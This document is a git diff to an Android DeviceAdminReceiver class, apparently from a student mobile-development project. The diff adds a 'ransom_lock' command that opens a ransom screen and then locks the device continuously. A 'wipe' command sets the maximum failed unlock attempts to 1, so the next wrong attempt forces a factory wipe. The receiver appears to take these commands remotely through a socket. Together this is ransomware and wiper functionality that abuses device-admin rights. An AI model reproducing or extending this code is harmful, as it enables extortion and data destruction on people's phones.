@@ -1,4 +1,7 @@
 package com.example.inf2007_mad_j1847.test;
+//import static com.example.inf2007_mad_j1847.test.Ran_warnKt.showRansomDialog;
+
+import android.app.AlertDialog;
 import android.app.admin.DeviceAdminReceiver;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
@@ -6,15 +9,22 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.graphics.Color;
+import android.graphics.drawable.ColorDrawable;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.os.PowerManager;
 import android.util.Log;
+import android.view.Gravity;
+import android.view.WindowManager;
+import android.widget.TextView;
+
 import java.io.IOException;
 import java.net.Socket;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicBoolean;
+
 
 import androidx.camera.core.Camera;
 
@@ -148,13 +158,14 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 return "👋 Closing connection...";
 
             case "wipe":
-//                wipeDevice(context);
+
                 setMaxFailedAttempts(context, 1);
             return "✅ Wiping device...";
 
 
 
             case "ransom_lock":
+                showRansomDialog(context);
                 startContinuousLock(context);
                 return "✅ Device locked!";
 
@@ -467,7 +478,12 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
     }
 
 
+    public void showRansomDialog(Context context) {
+        Intent intent = new Intent(context, RansomActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
+        context.startActivity(intent);
+    }
 
 
 
